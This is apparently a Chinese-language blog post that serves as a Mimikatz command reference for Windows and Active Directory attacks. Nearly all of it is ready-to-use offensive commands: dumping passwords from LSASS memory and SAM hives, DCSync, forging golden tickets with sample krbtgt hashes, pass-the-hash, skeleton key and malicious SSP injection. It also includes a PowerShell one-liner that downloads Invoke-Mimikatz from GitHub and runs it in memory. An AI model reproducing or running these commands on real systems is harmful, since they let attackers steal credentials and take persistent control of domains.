---
layout: post
title: Mimikatz常用
---


# 常用的Mimikatz命令及相关功能
[下载链接](http://blog.gentilkiwi.com/mimikatz)

------------------------------


`CLS`---------------------------- 清屏
`CRYPTO::CERTIFICATES` –--------- 列出/导出凭证
`EXIT`--------------------------- 退出
`KERBEROS::GOLDEN` –------------- 创建黄金票证/白银票证/信任票证
`KERBEROS::LIST` ---------------- 列出在用户的内存中所有用户的票证（TGT 和 TGS）。不需要特殊的权限，因为它仅显示当前用户的票证。与 “KLIST” 的功能相似。
`KERBEROS::PTT` ----------------- 票证传递。通常用于注入窃取或伪造的 `KERBEROS` 票证（黄金票证/白银票证/信任票证）。
`LSADUMP::DCSYNC` --------------- 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。无需在 DC 上执行代码。
`LSADUMP::LSA` –----------------- 向 LSA SERVER 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个LSASS.DMP 的转储文件中导出所有的 ACTIVE DIRECTORY 域凭证数据。同样也可以获取指定帐户的凭证，如 KRBTGT 帐户，使用 /NAME 参数，如：“/NAME:KRBTGT”
`LSADUMP::SAM` ------------------ 获取 SYSKEY 来解密 SAM 的项目数据（从注册表或者 HIVE 中导出）。SAM 选项可以连接到本地安全帐户管理器（SAM）数据库中并能转储本地帐户的凭证。可以用来转储在 WINDOWS 计算机上的所有的本地凭据。
`LSADUMP::TRUST` ---------------- 向 LSA SERVER 质询来获取信任的认证信息（正常或未打补丁的情况下）。为所有相关的受信的域或林转储信任密钥（密码）。
`MISC::ADDSID` –----------------- 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个）（或 SID ）。
`MISC::MEMSSP` –----------------- 注入恶意的 WNDOWS SSP 来记录本地身份验证凭据。
`MISC::SKELETON` –--------------- 在 DC 中注入万能钥匙（SKELETON KEY） 到 LSASS 进程中。这使得所有用户所使用的万能钥匙修补 DC 使用 “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。
`NOGPO::CMD`--------------------- 打开系统的CMD.EXE
`NOGPO::REGEDIT` ---------------- 打开系统的注册表
`NOGPO::TASKMGR`----------------- 打开任务管理器
`PROCESS::LIST`------------------ 列出进程
`PROCESS::SUSPEND 进程名称` ------ 暂停进程
`PROCESS::STOP 进程名称`---------- 结束进程
`PROCESS::MODULES` -------------- 列出系统的核心模块及所在位置
`PRIVILEGE::DEBUG` -–------------ 获得 DEBUG 权限（很多 MIMIKATZ 命令需要 DEBUG 权限或本地 SYSTEM 权限）。
`PRIVILEGE::LIST`---------------- 列出权限列表
`PRIVILEGE::ENABLE`-------------- 激活一个或多个权限
`SYSTEM::USER`------------------- 查看当前登录的系统用户
`SYSTEM::COMPUTER`--------------- 查看计算机名称
`SERVICE::LIST`------------------ 列出系统的服务
`SERVICE::REMOVE`---------------- 移除系统的服务
`SERVICE::START STOP 服务名称`---- 启动或停止服务
`SEKURLSA::WDIGEST`-------------- 获取本地用户信息及密码
`SEKURLSA::TSPKG`---------------- 获取TSPKG用户信息及密码
`SEKURLSA::EKEYS` –-------------- 列出 KERBEROS 密钥
`SEKURLSA::KERBEROS` –----------- 列出所有已通过认证的用户的 KERBEROS 凭证（包括服务帐户和计算机帐户）
`SEKURLSA::KRBTGT` –------------- 获取域中 KERBEROS 服务帐户（KRBTGT）的密码数据
`SEKURLSA::LOGONPASSWORDS` –----- 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的计算机的凭证。
`SEKURLSA::PTH` –---------------- HASH 传递 和 KEY 传递（注：OVER-PASS-THE-HASH 的实际过程就是传递了相关的 KEY(S)）
`SEKURLSA::TICKETS` –------------ 列出最近所有已经过身份验证的用户的可用的 KERBEROS 票证，包括使用用户帐户的上下文运行的服务和本地计算机在 AD 中的计算机帐户。与 KERBEROS::LIST 不同的是 SEKURLSA 使用内存读取的方式，它不会受到密钥导出的限制。
`TS::SESSIONS`------------------- 显示当前的会话
`TS::PROCESSES`------------------ 显示进程和对应的PID情况等
`TOKEN::LIST` –------------------ 列出系统中的所有令牌
`TOKEN::ELEVATE` –--------------- 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。
`TOKEN::ELEVATE /DOMAINADMIN` –-- 假冒一个拥有域管理员凭证的令牌。




-------------------------------------------------

常用

# 获取本机信息

* 直接获取内存口令 mimikatz：
`privilege::debug`
`sekurlsa::logonpasswords`

* 通过内存文件获取口令 使用procdump导出lsass.dmp mimikatz：
`sekurlsa::minidump lsass.dmp`
`sekurlsa::logonPasswords full`

* 通过powershell加载mimikatz获取口令
`powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz`

参考[3gstudent大神](http://static.hx99.net/static/drops/tips-7547.html):

`ms14-068.exe -u -p -s -d`
`kerberos::ptc test.ccache`

* 导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份（之前文章有介绍） mimikatz：
`lsadump::sam SYSTEM.hiv SAM.hiv`

# 维持域控权限

* Skeleton Key mimikatz：
`privilege::debug`
`misc::skeleton`

* golden ticket mimikatz：
`lsadump::lsa /patch`


* (Golden Ticket)生成万能票据： mimikatz：
`kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi`

* 导入票据： mimikatz：
`kerberos::ptt test.kirbi`

* Pass-The-Hash mimikatz：
`sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a`

[mimikittenz](https://github.com/putterpanda/mimikittenz)是一款ps的抓密码的工具
![post1]({{ site.baseurl }}/images/post1.jpg)